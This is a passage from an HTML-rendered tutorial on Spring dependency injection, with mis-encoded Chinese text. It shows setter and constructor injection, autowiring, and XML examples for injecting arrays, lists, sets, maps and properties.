punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token comment">&lt;!--æ³¨å…¥å¼•ç”¨ç±»å‹--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang.service.impl.BookServiceImpl<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--propertyæ ‡ç­¾ï¼šè®¾ç½®æ³¨å…¥å±æ€§--&gt;</span>        <span class="token comment">&lt;!--nameå±æ€§ï¼šè®¾ç½®æ³¨å…¥çš„å±æ€§åï¼Œå®é™…æ˜¯setæ–¹æ³•å¯¹åº”çš„åç§°--&gt;</span>        <span class="token comment">&lt;!--refå±æ€§ï¼šè®¾ç½®æ³¨å…¥å¼•ç”¨ç±»å‹beançš„idæˆ–name--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Appä¸»å‡½æ•°å®ç°</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppForDISet</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BookService</span> bookService <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BookService</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookService"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>è¿è¡Œç»“æœï¼š</p><img src="image-20220330152847973.png"></li></ul><h4 id="æ„é€ å™¨æ³¨å…¥"><a href="#æ„é€ å™¨æ³¨å…¥" class="headerlink" title="æ„é€ å™¨æ³¨å…¥"></a>æ„é€ å™¨æ³¨å…¥</h4><p>æ„é€ å™¨æ³¨å…¥ä¸éœ€è¦setæ–¹æ³•</p><p>ç”Ÿæˆæ„é€ æ–¹æ³•ï¼Œä¸setteræ–¹å¼æ³¨å…¥ç›¸æ¯”ï¼Œåªæ˜¯æ¢ä¸ªæ–¹æ³•ï¼Œè¿˜æ˜¯å‚æ•°å¾€é‡Œä¼ </p><ul><li>BookServiceImplæ·»åŠ æ„é€ æ–¹æ³•</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">UserDao</span> userDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">BookServiceImpl</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">,</span> <span class="token class-name">UserDao</span> userDao<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>bookDao <span class="token operator">=</span> bookDao<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>userDao <span class="token operator">=</span> userDao<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        userDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>åŒç†BookDaoImplå»ºç«‹æ„é€ æ–¹æ³•</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> databaseName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> connectionNum<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">BookDaoImpl</span><span class="token punctuation">(</span><span class="token class-name">String</span> databaseName<span class="token punctuation">,</span> <span class="token keyword">int</span> connectionNum<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>databaseName <span class="token operator">=</span> databaseName<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>connectionNum <span class="token operator">=</span> connectionNum<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ..."</span><span class="token operator">+</span>databaseName<span class="token operator">+</span><span class="token string">","</span><span class="token operator">+</span>connectionNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ApplicationContextä½¿ç”¨<code>constructor-arg </code>æ ‡ç­¾</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--                    æ­¤æ–¹æ³•ä½¿å½¢å‚åä¸è€¦åˆï¼Œæ”¹å½¢å‚åä¸å½±å“type&lt;bean id = "bookDao" class = "com.yang.dao.Impl.BookDaoImpl"&gt;--&gt;</span><span class="token comment">&lt;!--        &lt;constructor-arg type="int" value="100"/&gt;--&gt;</span><span class="token comment">&lt;!--        &lt;constructor-arg type="java.lang.String" value="mysql"/&gt;--&gt;</span><span class="token comment">&lt;!--    &lt;/bean&gt;--&gt;</span><span class="token comment">&lt;!--    &lt;bean id = "bookService" class = "com.yang.service.Impl.BookServiceImpl"&gt;--&gt;</span><span class="token comment">&lt;!--        &lt;constructor-arg name="bookDao" ref="bookDao"/&gt;--&gt;</span><span class="token comment">&lt;!--        &lt;constructor-arg name="userDao" ref="userDao"/&gt;--&gt;</span><span class="token comment">&lt;!--    &lt;/bean&gt;--&gt;</span><span class="token comment">&lt;!--    &lt;bean id="userDao" class="com.yang.dao.Impl.UserDaoImpl"/&gt;--&gt;</span>    <span class="token comment">&lt;!--è§£å†³å‚æ•°ç±»å‹é‡å¤é—®é¢˜ï¼Œä½¿ç”¨ä½ç½®è§£å†³å‚æ•°åŒ¹é…--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang.dao.Impl.BookDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--æ ¹æ®æ„é€ æ–¹æ³•å‚æ•°ä½ç½®æ³¨å…¥--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mysql<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">index</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang.dao.Impl.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang.service.Impl.BookServiceImpl<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Appç±»ä¸å˜</li></ul><h4 id="ä¾èµ–æ³¨å…¥æ–¹å¼é€‰æ‹©"><a href="#ä¾èµ–æ³¨å…¥æ–¹å¼é€‰æ‹©" class="headerlink" title="ä¾èµ–æ³¨å…¥æ–¹å¼é€‰æ‹©"></a>ä¾èµ–æ³¨å…¥æ–¹å¼é€‰æ‹©</h4><ol><li>å¼ºåˆ¶ä¾èµ–ä½¿ç”¨æ„é€ å™¨è¿›è¡Œï¼Œä½¿ç”¨setteræ³¨å…¥æœ‰æ¦‚ç‡ä¸è¿›è¡Œæ³¨å…¥å¯¼è‡´nullå¯¹è±¡å‡ºç°</li><li>å¯é€‰ä¾èµ–ä½¿ç”¨setteræ³¨å…¥è¿›è¡Œï¼Œçµæ´»æ€§å¼º</li><li>Springæ¡†æ¶å€¡å¯¼ä½¿ç”¨æ„é€ å™¨ï¼Œç¬¬ä¸‰æ–¹æ¡†æ¶å†…éƒ¨å¤§å¤šæ•°é‡‡ç”¨æ„é€ å™¨æ³¨å…¥çš„å½¢å¼è¿›è¡Œæ•°æ®åˆå§‹åŒ–ï¼Œç›¸å¯¹ä¸¥è°¨</li><li>å¦‚æœæœ‰å¿…è¦å¯ä»¥ä¸¤è€…åŒæ—¶ä½¿ç”¨ï¼Œä½¿ç”¨æ„é€ å™¨æ³¨å…¥å®Œæˆå¼ºåˆ¶ä¾èµ–çš„æ³¨å…¥ï¼Œä½¿ç”¨setteræ³¨å…¥å®Œæˆå¯é€‰ä¾èµ–çš„æ³¨å…¥</li><li>å®é™…å¼€å‘è¿‡ç¨‹ä¸­è¿˜è¦æ ¹æ®å®é™…æƒ…å†µåˆ†æï¼Œå¦‚æœå—æ§å¯¹è±¡æ²¡æœ‰æä¾›setteræ–¹æ³•å°±å¿…é¡»ä½¿ç”¨æ„é€ å™¨æ³¨å…¥</li><li><strong>è‡ªå·±å¼€å‘çš„æ¨¡å—æ¨èä½¿ç”¨setteræ³¨å…¥</strong></li></ol><h3 id="ä¾èµ–è‡ªåŠ¨è£…é…"><a href="#ä¾èµ–è‡ªåŠ¨è£…é…" class="headerlink" title="ä¾èµ–è‡ªåŠ¨è£…é…"></a>ä¾èµ–è‡ªåŠ¨è£…é…</h3><h4 id="è‡ªåŠ¨è£…é…æ¦‚å¿µ"><a href="#è‡ªåŠ¨è£…é…æ¦‚å¿µ" class="headerlink" title="è‡ªåŠ¨è£…é…æ¦‚å¿µ"></a>è‡ªåŠ¨è£…é…æ¦‚å¿µ</h4><ul><li>IoCå®¹å™¨æ ¹æ®beanæ‰€ä¾èµ–çš„èµ„æºåœ¨å®¹å™¨ä¸­è‡ªåŠ¨æŸ¥æ‰¾å¹¶æ³¨å…¥åˆ°beanä¸­çš„è¿‡ç¨‹ç§°ä¸ºè‡ªåŠ¨è£…é…</li><li>è‡ªåŠ¨è£…é…æ–¹å¼<br><strong>æŒ‰ç±»å‹ï¼ˆå¸¸ç”¨ï¼‰</strong><br>æŒ‰åç§°<br>æŒ‰æ„é€ æ–¹æ³•<br>ä¸å¯ç”¨è‡ªåŠ¨è£…é…</li></ul><h4 id="è‡ªåŠ¨è£…é…ç±»å‹"><a href="#è‡ªåŠ¨è£…é…ç±»å‹" class="headerlink" title="è‡ªåŠ¨è£…é…ç±»å‹"></a>è‡ªåŠ¨è£…é…ç±»å‹</h4><h5 id="ä¾èµ–è‡ªåŠ¨è£…é…-1"><a href="#ä¾èµ–è‡ªåŠ¨è£…é…-1" class="headerlink" title="ä¾èµ–è‡ªåŠ¨è£…é…"></a>ä¾èµ–è‡ªåŠ¨è£…é…</h5><blockquote><p>é…ç½®ä¸­ä½¿ç”¨beanæ ‡ç­¾autowireå±æ€§è®¾ç½®è‡ªåŠ¨è£…é…çš„ç±»å‹ï¼Œæœ‰æŒ‰åç§°æˆ–è€…ç±»å‹ï¼ˆä¸»è¦æ˜¯æŒ‰ç±»å‹ï¼‰</p></blockquote><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.service.impl.BookServiceImpl<span class="token punctuation">"</span></span> <span class="token attr-name">autowire</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>byType<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="ä¾èµ–è‡ªåŠ¨è£…é…ç‰¹å¾"><a href="#ä¾èµ–è‡ªåŠ¨è£…é…ç‰¹å¾" class="headerlink" title="ä¾èµ–è‡ªåŠ¨è£…é…ç‰¹å¾"></a>ä¾èµ–è‡ªåŠ¨è£…é…ç‰¹å¾</h5><ol><li>è‡ªåŠ¨è£…é…ç”¨äºå¼•ç”¨ç±»å‹ä¾èµ–æ³¨å…¥ï¼Œä¸èƒ½å¯¹ç®€å•ç±»å‹è¿›è¡Œæ“ä½œ</li><li>ä½¿ç”¨æŒ‰ç±»å‹è£…é…æ—¶ï¼ˆbyTypeï¼‰å¿…é¡»ä¿éšœå®¹å™¨ä¸­ç›¸åŒç±»å‹çš„beanå”¯ä¸€ï¼Œæ¨èä½¿ç”¨</li><li>ä½¿ç”¨æŒ‰åç§°è£…é…æ—¶ï¼ˆbyNameï¼‰å¿…é¡»ä¿éšœå®¹å™¨ä¸­å…·æœ‰æŒ‡å®šåç§°çš„beanï¼Œå› å˜é‡åä¸é…ç½®è€¦åˆï¼Œä¸æ¨èä½¿ç”¨</li><li>è‡ªåŠ¨è£…é…ä¼˜å…ˆçº§ä½äºsetteræ³¨å…¥ä¸æ„é€ å™¨æ³¨å…¥ï¼ŒåŒæ—¶å‡ºç°æ—¶è‡ªåŠ¨è£…é…é…ç½®å¤±æ•ˆ</li></ol><h3 id="é›†åˆæ³¨å…¥"><a href="#é›†åˆæ³¨å…¥" class="headerlink" title="é›†åˆæ³¨å…¥"></a>é›†åˆæ³¨å…¥</h3><h4 id="æ³¨å…¥æ•°ç»„ç±»å‹æ•°æ®"><a href="#æ³¨å…¥æ•°ç»„ç±»å‹æ•°æ®" class="headerlink" title="æ³¨å…¥æ•°ç»„ç±»å‹æ•°æ®"></a>æ³¨å…¥æ•°ç»„ç±»å‹æ•°æ®</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>array<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>array</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>200<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>300<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>array</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ³¨å…¥Listç±»å‹æ•°æ®"><a href="#æ³¨å…¥Listç±»å‹æ•°æ®" class="headerlink" title="æ³¨å…¥Listç±»å‹æ•°æ®"></a>æ³¨å…¥Listç±»å‹æ•°æ®</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>itcast<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>itheima<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>boxuegu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>chuanzhihui<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ³¨å…¥Setç±»å‹æ•°æ®"><a href="#æ³¨å…¥Setç±»å‹æ•°æ®" class="headerlink" title="æ³¨å…¥Setç±»å‹æ•°æ®"></a>æ³¨å…¥Setç±»å‹æ•°æ®</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>set<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>set</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>itcast<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>itheima<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>boxuegu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>boxuegu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>set</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ³¨å…¥Mapç±»å‹æ•°æ®"><a href="#æ³¨å…¥Mapç±»å‹æ•°æ®" class="headerlink" title="æ³¨å…¥Mapç±»å‹æ•°æ®"></a>æ³¨å…¥Mapç±»å‹æ•°æ®</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>map<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>country<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>china<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>province<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>henan<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>city<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>kaifeng<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ³¨å…¥Propertiesç±»å‹æ•°æ®"><a href="#æ³¨å…¥Propertiesç±»å‹æ•°æ®" class="headerlink" title="æ³¨å…¥Propertiesç±»å‹æ•°æ®"></a>æ³¨å…¥Propertiesç±»å‹æ•°æ®</h4><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>properties<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>props</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>country<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>china<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">&gt;</span></span>        <span class="token 